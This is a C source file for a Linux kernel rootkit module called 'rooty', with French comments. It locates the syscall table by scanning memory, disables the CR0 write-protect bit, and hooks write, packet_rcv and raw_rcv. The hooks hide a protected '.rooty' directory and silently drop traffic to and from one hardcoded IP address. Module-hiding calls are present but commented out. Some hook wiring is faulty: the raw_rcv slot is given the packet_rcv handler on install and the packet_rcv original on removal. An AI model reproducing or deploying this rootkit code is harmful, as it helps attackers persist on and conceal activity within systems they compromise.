#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/kobject.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/netdevice.h>
#include <linux/skbuff.h>
#include <linux/ip.h>		       
#include <linux/if_ether.h>	       


MODULE_LICENSE("GPL");
int rooty_init(void);
void rooty_exit(void);
module_init(rooty_init);
module_exit(rooty_exit);

#if defined(__i386__)
#define START_CHECK 0xc0000000
#define END_CHECK	0xd0000000
typedef unsigned int psize;
#else
#define START_CHECK	0xffffffff81000000
#define END_CHECK	0xffffffffa2000000
typedef unsigned long psize;
#endif

//l'adresse IP dont on veut rendre les communications invisibles
#define IP    htonl(0xac140023)

//La table d'appels systèmes
psize *sys_call_table;
psize *sym_pr;
psize *sym_rr;

//Les adresses des appels que l'on hijack
asmlinkage ssize_t (*o_write)(int fd, char *buff, ssize_t count);
asmlinkage static int (*o_packet_rcv)(struct sk_buff *skb, struct net_device *dev,struct packet_type *pt);
asmlinkage static int (*o_raw_rcv)(struct sock *sk, struct sk_buff *skb);

//Cette fonction recherche l'adresse de la table d'appels systèmes
psize **find(void)
{
	psize **sctable;
	psize i = START_CHECK;
	while (i < END_CHECK)
	{
		sctable = (psize **)i;
		if (sctable[__NR_close] == (psize *)sys_close)
		{
			return &sctable[0];
		}
		i += sizeof(void *);
	}

	return NULL;
}

/*------------------FONCTIONS DE REPLACEMENT DES APPELS SYSTEME------------------*/


//write
asmlinkage ssize_t rooty_write(int fd, const char __user *buff, size_t count)
{
	ssize_t ret;
	char *proc_protect = ".rooty"; /* Le dossier à protéger */
	char *kbuff = (char *)kmalloc(256, GFP_KERNEL);

	copy_from_user(kbuff, buff, 255);

	if (strstr(kbuff, proc_protect))
	{
		kfree(kbuff);
		return EEXIST;
	}

	ret = o_write(fd, buff, count);
	kfree(kbuff);

	return ret;
}

//packet_rcv
asmlinkage int rooty_packet_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt)
{  
  int ret;
  
  struct iphdr* iph = ip_hdr(skb);

  /* Vérififie l'adresse de provenance ou de destination du paquet*/
  if (skb->protocol == htons(ETH_P_IP)){   /* Si il s'agit d'un paquet IP */
    if (iph->saddr == IP || iph->daddr == IP){ /*Et que l'adresse est bonne*/
      printk("rooty : paquet received\n");
      return 0;		    /* L'ignorer */
    }
  }
  ret = o_packet_rcv(skb, dev, pt);

  return ret;
 }

//raw_rcv
asmlinkage int rooty_raw_rcv(struct sock* sock, struct sk_buff *skb)
{  
  int ret;
  
  struct iphdr* iph = ip_hdr(skb);

  /* Vérififie l'adresse de provenance ou de destination du paquet*/
  if (skb->protocol == htons(ETH_P_IP)){   /* Si il s'agit d'un paquet IP */
    if (iph->saddr == IP || iph->daddr == IP){ /*Et que l'adresse est bonne*/
      printk("rooty : paquet received\n");
      return 0;		    /* L'ignorer */
    }
  }
  ret = o_raw_rcv(sock, skb);

  return ret;
 }



int rooty_init(void)
{
/*	To hide the module */
/*
	list_del_init(&__this_module.list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
*/

	if ((sys_call_table = (psize *)find()) != NULL)
		printk("rooty : sys_call_table found at %p\n", sys_call_table);
	else
		printk("rooty : sys_call_table not found\n");



    sym_pr = (psize *)kallsyms_lookup_name("packet_rcv");
    sym_rr = (psize *)kallsyms_lookup_name("raw_rcv");

    printk("rooty : write found at %p\n", &sys_call_table[__NR_write]);
    printk("rooty : packet_rcv found at %p\n", sym_pr);
    printk("rooty : raw_rcv found at %p\n", sym_rr);




    write_cr0(read_cr0() & (~0x10000));


    o_write = (void *)xchg(&sys_call_table[__NR_write], rooty_write);
    o_packet_rcv = (void *)xchg(sym_pr, rooty_packet_rcv);
    o_raw_rcv = (void *)xchg(sym_rr, rooty_packet_rcv);
    write_cr0(read_cr0() | 0x10000);


    printk("rooty : write is now at %p\n", &sys_call_table[__NR_write]);
    printk("rooty : packet_rcv is now at %p\n", sym_pr);
    printk("rooty : raw_rcv is now at %p\n", sym_rr);



    return 0;
}

void rooty_exit(void)
{
	write_cr0(read_cr0() & (~0x10000));

	xchg(&sys_call_table[__NR_write], o_write);
        xchg(sym_pr, o_packet_rcv);
	xchg(sym_rr, o_packet_rcv);
	write_cr0(read_cr0() | 0x10000);
	printk("rooty : module removed\n");
}


